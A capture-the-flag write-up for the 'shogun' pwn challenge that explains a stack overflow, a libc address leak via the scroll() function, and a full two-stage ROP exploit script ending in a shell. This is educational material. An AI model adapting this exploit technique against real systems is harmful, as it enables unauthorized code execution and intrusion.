# Analyzing the binary #

We are given both the source and the instructions to compile the binary. We see that **PIE** and **stack cookies** are disabled.

```
shogun: shogun.c
	@gcc shogun.c -o shogun -fno-stack-protector -no-pie -Wl,-z,relro,-z,now
```

Since we're provided with a Docker container, we also know the libc version. 

## checksec ##
Checksec also tells us that stack cookies and PIE are disabled.
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## source code ## 
Looking at the source code, we see a couple of functions.

The **scroll()** function takes a pointer to a string and then prints out each character followed by a small delay.
```c
void scroll(char* txt) {
    size_t len = strlen(txt);
    for(size_t i = 0; i < len; i++) {
        char c = txt[i];
        putchar(c);
        usleep((c == '\n' ? 1000 : 50) * 1000);
    }
}
```

Next up is **encounter()**, this function is trivially vulnerable to a stack based buffer overflow: it reads up to 81 characters into a 32-byte buffer. 

```c
void encounter() {
    scroll(txt[1]);
    char buf2[32];
    fgets(buf2, 81, stdin);
}
```

Lastly there's **main()**, which basically calls the vulnerable function **encounter()** if its provided with the right input ("Look around.")

```c
int main() {
    setvbuf(stdout, 0, 2, 0);

    scroll(txt[0]);
    char buf1[24];
    fgets(buf1, 24, stdin);
    if(strncmp("Look around.", buf1, 12) == 0) {
        encounter();
        scroll(txt[3]);
    } else {
        scroll(txt[2]);
    }
}
```

# Exploitation #


## Patching the binary to remove usleep() ## 
We noticed that all the output of the program is done through **scroll()**, which adds a small delay throguh usleep(). To make our lifes a little bit easier while debugging and developing an exploit, we patch this function out with the following script:

```python
#!/usr/bin/env python3
from pwn import *
elf = ELF('./shogun')

#Nulify usleep function
elf.asm(elf.symbols['usleep'], 'ret')
elf.save('./shogun-patched')
```


## Exploitation Strategy ## 
The challenge constraints are as follows:
- We can hijack control flow through the buffer overflow 
- Since **PIE** is disabled, we know the addresses of ROP-gadgets so we can craft a ROP chain. 

Most often in these kind of buffer overflow challenges, the approach to getting a shell would be the following: 

- craft a first-stage ROP chain that calls a function like puts() or printf() with the address of a function in the GOT, like puts@got or printf@got. This will leak an address inside LIBC
- at the end of the first-stage ROP chain, return back into the start of the binary so it restarts and we can exploit the buffer overflow again
- craft a second-stage ROP chain that calls system("/bin/sh")

In this particular challenge we dont have access to a function like puts() or printf(), only putchar(), which does not take a pointer but a value. This means that we can't leak any memory contents. 

Luckily for us, the binary itself has the scroll() function, which does take a pointer. So instead of the usual puts(puts@GOT) we call scroll(putchar@GOT), which then leaks the address of putchar in libc.

## Exploit ## 

```python
#!/usr/bin/env python3 
from pwn import *

#r = process(["./ld-2.31.so","./shogun"], env={"LD_PRELOAD":"./libc-2.31.so"})
r = remote("pwn.chall.pwnoh.io", 13373)
e = ELF("./shogun")

r.sendlineafter(b"a disturbance. ", b"Look around.")


rop = ROP(e)

gadgets = [
    rop.find_gadget(["pop rdi", "ret"]).address, 
    e.got['putchar'],
    rop.find_gadget(["ret"]).address, 
    e.symbols['scroll'],
    e.symbols['_start'],
]

payload = b"".join(p64(gadget) for gadget in gadgets)
payload = b"A" * 40 + payload
print(payload)

info(f"sending stage 1..")
r.sendafter(b"He attacks you! ", payload)

sleep(5)
leak = u64(r.recv(6).ljust(8, b"\x00"))
info(f"putchar leak: {hex(leak)}")

r.sendlineafter(b"a disturbance. ", b"Look around.")

##################
e = ELF("./libc-2.31.so")
e.address = leak - e.symbols['putchar']

info(f"libc_base: {hex(e.address)}")

gadgets = [
    rop.find_gadget(["pop rdi", "ret"]).address, 
    next(e.search(b"/bin/sh\x00")),
    rop.find_gadget(["ret"]).address, 
    e.symbols['system']
]

payload = b"".join(p64(gadget) for gadget in gadgets)
payload = b"A" * 40 + payload
print(payload)


pause()
info(f"sending stage 2..")
r.sendlineafter(b"He attacks you! ", payload)

r.interactive()
```